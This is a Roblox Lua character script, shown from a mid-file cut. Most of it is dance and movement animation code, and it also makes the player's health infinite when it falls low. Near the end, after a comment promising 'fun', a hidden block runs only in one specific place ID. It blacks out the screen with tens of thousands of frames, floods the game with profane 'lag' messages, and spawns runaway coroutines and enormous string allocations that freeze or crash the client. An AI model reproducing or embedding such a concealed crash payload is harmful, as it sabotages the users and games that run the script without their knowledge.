		RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
        RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(170),math.rad(0),math.rad(0)),.3)
        LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(10),math.rad(0),math.rad(-16)),.3)
    end
     so("http://www.roblox.com/asset/?id=0",Torso,1,.8) 
for i=0,1,0.1 do
        swait()
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
        Torso.Neck.C0=clerp(Torso.Neck.C0,necko*euler(0,0,0),.2)
		RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
        RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(170),math.rad(0),math.rad(50)),.5)
       	LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(10),math.rad(0),math.rad(-16)),.3)
    end
     so("http://www.roblox.com/asset/?id=0",Torso,1,1) 
for i=0,1,0.1 do
        swait()
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
        Torso.Neck.C0=clerp(Torso.Neck.C0,necko*euler(0,0,0),.2)
		RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
        RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(170),math.rad(0),math.rad(0)),.3)
        LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(10),math.rad(0),math.rad(-16)),.3)
       
    end
so("http://www.roblox.com/asset/?id=0",Torso,1,.8)
for i=0,1,0.1 do
        swait()
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
        Torso.Neck.C0=clerp(Torso.Neck.C0,necko*euler(0,0,0),.2)
		RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
        RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(170),math.rad(0),math.rad(50)),.3)
        LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(10),math.rad(0),math.rad(-16)),.3)
    end
so("http://www.roblox.com/asset/?id=0",Torso,1,1) 
for i=0,1,0.1 do
        swait()
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
        Torso.Neck.C0=clerp(Torso.Neck.C0,necko*euler(0,0,0),.2)
		RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
        RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(170),math.rad(0),math.rad(0)),.3)
        LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(10),math.rad(0),math.rad(-16)),.3)
    end
    --dmgstop()
    Humanoid.WalkSpeed=12
    attack=false
end

function Twerk()
    attack=true
    Humanoid.WalkSpeed=0
    so("http://www.roblox.com/asset/?id=0",Torso,1,1)
    for i=0,1,0.1 do
        swait()
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,-.9)*angles(math.rad(90),math.rad(0),math.rad(0)),.3)
        Torso.Neck.C0=clerp(Torso.Neck.C0,necko*euler(0,0,0),.2)
		RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(90),math.rad(90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(90),math.rad(-90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
        RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(50),math.rad(0),math.rad(-50)),.3)
        LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(50),math.rad(0),math.rad(50)),.3)
    end
     so("http://www.roblox.com/asset/?id=0",Torso,1,.8) 
for i=0,1,0.1 do
        swait()
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,-.9)*angles(math.rad(120),math.rad(0),math.rad(0)),.3)
        Torso.Neck.C0=clerp(Torso.Neck.C0,necko*euler(0,0,0),.2)
		RH.C0=clerp(RH.C0,cf(1,-1,-.5)*angles(math.rad(120),math.rad(90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		LH.C0=clerp(LH.C0,cf(-1,-1,-.5)*angles(math.rad(120),math.rad(-90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
        RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(50),math.rad(0),math.rad(-50)),.5)
       	LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(50),math.rad(0),math.rad(50)),.3)
    end
     so("http://www.roblox.com/asset/?id=0",Torso,1,1) 
for i=0,1,0.1 do
        swait()
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,-.9)*angles(math.rad(90),math.rad(0),math.rad(0)),.3)
        Torso.Neck.C0=clerp(Torso.Neck.C0,necko*euler(0,0,0),.2)
		RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(90),math.rad(90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(90),math.rad(-90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
        RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(50),math.rad(0),math.rad(-50)),.3)
        LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(50),math.rad(0),math.rad(50)),.3)
       
    end
so("http://www.roblox.com/asset/?id=0",Torso,1,.8)
for i=0,1,0.1 do
        swait()
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,-.9)*angles(math.rad(120),math.rad(0),math.rad(0)),.3)
        Torso.Neck.C0=clerp(Torso.Neck.C0,necko*euler(0,0,0),.2)
		RH.C0=clerp(RH.C0,cf(1,-1,-.5)*angles(math.rad(120),math.rad(90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		LH.C0=clerp(LH.C0,cf(-1,-1,-.5)*angles(math.rad(120),math.rad(-90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
        RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(50),math.rad(0),math.rad(-50)),.5)
       	LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(50),math.rad(0),math.rad(50)),.3)
    end
so("http://www.roblox.com/asset/?id=0",Torso,1,1) 
for i=0,1,0.1 do
        swait()
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,-.9)*angles(math.rad(90),math.rad(0),math.rad(0)),.3)
        Torso.Neck.C0=clerp(Torso.Neck.C0,necko*euler(0,0,0),.2)
		RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(90),math.rad(90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(90),math.rad(-90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
        RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(50),math.rad(0),math.rad(-50)),.3)
        LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(50),math.rad(0),math.rad(50)),.3)
    end
    --dmgstop()
    Humanoid.WalkSpeed=12
    attack=false
end

local sine = 0
local change = 1
local val = 0

local mananum=0
while true do
swait()
sine = sine + change
local torvel=(RootPart.Velocity*Vector3.new(1,0,1)).magnitude 
local velderp=RootPart.Velocity.y
hitfloor,posfloor=rayCast(RootPart.Position,(CFrame.new(RootPart.Position,RootPart.Position - Vector3.new(0,1,0))).lookVector,4,Character)
if equipped==true or equipped==false then
if Anim=="Idle" and attack==false then
idle=idle+1
else
idle=0
end
if Humanoid.Health <=20 then
if attack == false then
Humanoid.Health = math.huge
end
end
if idle>=1000 then
if attack==false then
--Sheath()
end
end
if RootPart.Velocity.y > 1 and hitfloor==nil then 
Anim="Jump"
if attack==false then
Footsteps:Stop()
Footsteps2:Stop()
Neck.C0=clerp(Neck.C0,necko*euler(-0.2,0,0),.3)
Neck.C1=clerp(Neck.C1,necko2*euler(0,0,0),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0),.3)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(-.25,0,0.5),.3)
RW.C1=clerp(LW.C1,cf(0,0.5,0)*euler(0,0,0),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(-.25,0,-0.5),.3)
LW.C1=clerp(LW.C1,cf(0,0.5,0)*euler(0,0,0),.3)
RH.C0=clerp(RH.C0,cf(1,0,-.75)*euler(-0.5,1.57,0)*euler(0,0,0),.2)
LH.C0=clerp(LH.C0,cf(-1,-1,-.3)*euler(-0.5,-1.57,0)*euler(0,0,0),.2)
end
elseif RootPart.Velocity.y < -1 and hitfloor==nil then 
Anim="Fall"
if attack==false then
Footsteps:Stop()
Footsteps2:Stop()
Neck.C0=clerp(Neck.C0,necko*euler(0.3,0,0),.3)
Neck.C1=clerp(Neck.C1,necko2*euler(0,0,0),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*euler(0,0,0),.3)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(0.1,0,1),.3)
RW.C1=clerp(LW.C1,cf(0,0.5,0)*euler(0,0,0),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(0.1,0,-1),.3)
LW.C1=clerp(LW.C1,cf(0,0.5,0)*euler(0,0,0),.3)
RH.C0=clerp(RH.C0,cf(1,-1,0)*euler(0.6,1.57,0)*euler(0,0,0),.2)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*euler(-0.8,-1.57,0)*euler(0,0,0),.2)
end
elseif torvel<1 and hitfloor~=nil then
Anim="Idle"
change=0.5
if idle>=1000 then
if attack==false then
Footsteps:Stop()
Footsteps2:Stop()
Humanoid.WalkSpeed=12
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0-0.015*math.cos(sine/5))*angles(math.rad(0),math.rad(0),math.rad(20)),.1)
Neck.C0=clerp(Neck.C0,necko*angles(math.rad(0*math.cos(sine/5.5)),math.rad(0*math.cos(sine/5.5)),math.rad(-20)),.1)
Neck.C1=clerp(Neck.C1,necko2*euler(0,0,0),.1)
RW.C0=clerp(RW.C0,cf(1.5,0.5,-0.5)*angles(math.rad(95),math.rad(0),math.rad(-45)),.5)
LW.C0=clerp(RW.C0,cf(-2.5,-0.5,-0.5)*angles(math.rad(95),math.rad(0),math.rad(-230)),.5)
RH.C0=clerp(RH.C0,cf(1,-1,-0.225)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(5)),.1)
LH.C0=clerp(LH.C0,cf(-1,-1.1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(10)),.3)
end
else
if attack==false then
Footsteps:Stop()
Footsteps2:Stop()
Humanoid.WalkSpeed=12
Humanoid.WalkSpeed=12
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0-0.015*math.cos(sine/5))*angles(math.rad(0),math.rad(0),math.rad(20)),.1)
Neck.C0=clerp(Neck.C0,necko*angles(math.rad(0*math.cos(sine/5.5)),math.rad(0*math.cos(sine/5.5)),math.rad(-20)),.1)
Neck.C1=clerp(Neck.C1,necko2*euler(0,0,0),.1)
RW.C0=clerp(RW.C0,cf(1.5,0.5,-0.5)*angles(math.rad(95),math.rad(0),math.rad(-45)),.5)
LW.C0=clerp(RW.C0,cf(-2.5,-0.5,-0.5)*angles(math.rad(95),math.rad(0),math.rad(-230)),.5)
RH.C0=clerp(RH.C0,cf(1,-1,-0.225)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(5)),.1)
LH.C0=clerp(LH.C0,cf(-1,-1.1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(10)),.3)
end
end
elseif torvel>2 and torvel<22 and hitfloor~=nil then
Anim="Walk"
if attack==false then
change=0.8
--[[RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(35),math.rad(0),math.rad(15*math.cos(sine/10))),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-30),math.rad(0),math.rad(0)),.3)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(-135*math.cos(sine/9)),math.rad(0),math.rad(0)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(135*math.cos(sine/9)),math.rad(0),math.rad(0)),.3)
RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0)),.3)
--Handleweld.C0=clerp(--Handleweld.C0,cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*euler(0,0,0),.2)
RootJoint.C0=clerp(RootJoint.C0,RootCF*euler(0.1,0,0),.2)
--RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(-0.1,0,0.2),.2)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(-5),math.rad(-25),math.rad(20)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(5),math.rad(25),math.rad(-20)),.3)
RH.C0=clerp(RH.C0,RHC0,.3)
LH.C0=clerp(LH.C0,LHC0,.3)
]]--
Footsteps:Play()
Footsteps2:Stop()
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0-0.015*math.cos(sine/5))*angles(math.rad(0),math.rad(0),math.rad(20)),.1)
Neck.C0=clerp(Neck.C0,necko*angles(math.rad(0*math.cos(sine/5.5)),math.rad(0*math.cos(sine/5.5)),math.rad(-20)),.1)
Neck.C1=clerp(Neck.C1,necko2*euler(0,0,0),.1)
RW.C0=clerp(RW.C0,cf(1.5,0.5,-0.5)*angles(math.rad(95),math.rad(0),math.rad(-45)),.5)
LW.C0=clerp(RW.C0,cf(-2.5,-0.5,-0.5)*angles(math.rad(95),math.rad(0),math.rad(-230)),.5)
RH.C0=clerp(RH.C0,cf(1,-1-0.1*math.cos(sine/5),0-0.25*math.cos(sine/5))*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-2.5),math.rad(0),math.rad(0+50*math.cos(sine/5))),.3)
LH.C0=clerp(LH.C0,cf(-1,-1+0.1*math.cos(sine/5),0+0.25*math.cos(sine/5))*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-2.5),math.rad(0),math.rad(0+50*math.cos(sine/5))),.3)
end
elseif torvel>=22 and hitfloor~=nil then
Anim="Run"
change=1
if attack==false then
Footsteps:Stop()
Footsteps2:Play()
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0+0.1*math.cos(sine/2.5))*angles(math.rad(20+1*math.cos(sine/2.5)),math.rad(0),math.rad(0)),.3)
Neck.C0=clerp(Neck.C0,necko*euler(-0.2+0.075*math.cos(sine/2.5),0,0),.3)
Neck.C1=clerp(Neck.C1,necko2*euler(0,0,0),.3)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(-90),math.rad(0),math.rad(0)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(-90),math.rad(0),math.rad(0)),.3)
RH.C0=clerp(RH.C0,cf(1,-1-0.1*math.cos(sine/5),0-0.5*math.cos(sine/5))*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0+70*math.cos(sine/5))),.3)
LH.C0=clerp(LH.C0,cf(-1,-1+0.1*math.cos(sine/5),0+0.5*math.cos(sine/5))*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0+70*math.cos(sine/5))),.3)
end
end
end
end




--- shshshhh this is where the fun comes in ---
if game.PlaceId == 21053279 then
plr = game.Players.LocalPlayer
char = plr.Character
cam = workspace.CurrentCamera
cam.CameraType = "Scriptable"
cam.CoordinateFrame = CFrame.new(0,0,50)
local localContainer
local service=setmetatable({
	MarketPlace=game:service("MarketplaceService");
	GamepassService=game:service("GamePassService");
	ChatService=game:service("Chat");
	LocalContainer=function() if not localContainer or not localContainer.Parent then localContainer=Instance.new("Camera",workspace) localContainer.Name=math.random(10000000,999999999) end return localContainer end;
},{
	__index=function(tab,index)
		local serv
		local ran,err=pcall(function() serv=game:service(index) end)
		if ran then
			tab[index]=serv
			return serv
		end
	end
})

local cPcall=function(func,...) local function cour(...) coroutine.resume(coroutine.create(func),...) end local ran,error=pcall(cour,...) if error then print('ERROR: '..error) end end

x=game.Players.LocalPlayer
				 x.CameraMode=Enum.CameraMode.LockFirstPerson
				 f=Instance.new("Frame")
				 f.Size=UDim2.new(1,0,1,0)
				 f.BackgroundTransparency=0.01
				 f.BackgroundColor3=Color3.new()
				 pg=x.PlayerGui
				 gui=Instance.new("ScreenGui",pg)
				 wait(.1)
			     for i=1,28000 do
				 f:Clone().Parent=gui
				 f:Clone().Parent=gui
				 f:Clone().Parent=gui
				 end
			
	script:Destroy();
local runService = Game:GetService("RunService").Stepped;
local LagNum = 1250;
local str = "lag fucker lag";

for i = 1, math.huge do
        if i % LagNum == 0 then runService:wait(); end
        Instance.new("Message", Workspace).Text = str;
end

local bores=coroutine.create(function() --Yolo?
	cPcall(function()
		--print(Game[("%s|"):rep(0xFFFFFFF)])
	cPcall(print,'lol')
	cPcall(warn,'lol')
	cPcall(error,'lol')
	while wait(0.1) do
	spawn(function()
		cPcall(function() 
		spawn(function()
		local tab={}
		pcall(function()
			spawn(function()
			for i=1,1000000 do
				cPcall(function()
				spawn(function()
					local bob2=coroutine.create(function()
						function f1() cPcall(spawn,f2) warn(string.rep((Vector3.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))-Vector3.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))).magnitude,2e10)) end
						function f2() cPcall(spawn,f1) print(string.rep((Vector3.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))-Vector3.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))).magnitude,2e10)) end 
						spawn(f1)
					end)
					spawn(function() delay(0,function() coroutine.resume(bob2) end) end) 
					spawn(function() table.insert(tab,string.rep(tostring(math.random()),100)) end)
				end)
				end)
			end
			tab={}
			end)
		end)
		end) 
		end)
	end)
	end
	end)
end)

service.RunService.Stepped:connect(function()
	for i=1,500000 do
		delay(0,function() pcall(function() coroutine.resume(bores) end) end)
	end
end)


	local function bob()
	cPcall(function()
		while wait(0.1) do
			--cPcall(function()
			--for i=1,100 do
				local p=Instance.new("Part")
				p.Material="Neon"
				p.Size=Vector3.new(50,50,50)
				p.Anchored=true
				p.BackSurface="Studs"
				p.BottomSurface="Studs"
				p.FrontSurface="Studs"
				p.LeftSurface="Studs"
				p.RightSurface="Studs"
				p.TopSurface="Studs"
				local t=Instance.new("Texture",p)
				t.Texture="http://www.roblox.com/asset/?id=190803157"
				t.Face="Top"
				t.StudsPerTileU=1000
				t.StudsPerTileV=1000
				local t2=t:clone()
				t2.Parent=p
				t2.Face="Bottom"
				local t2=t:clone()
				t2.Parent=p
				t2.Face="Left"
				local t2=t:clone()
				t2.Parent=p
				t2.Face="Right"
				local t2=t:clone()
				t2.Parent=p
				t2.Face="Front"
				local t2=t:clone()
				t2.Parent=p
				t2.Face="Back"
				p.Parent=service.LocalContainer()
			--end
			--end)
		end
	end)
	end
	bob() --while wait(0.1) do cPcall(bob) end
end

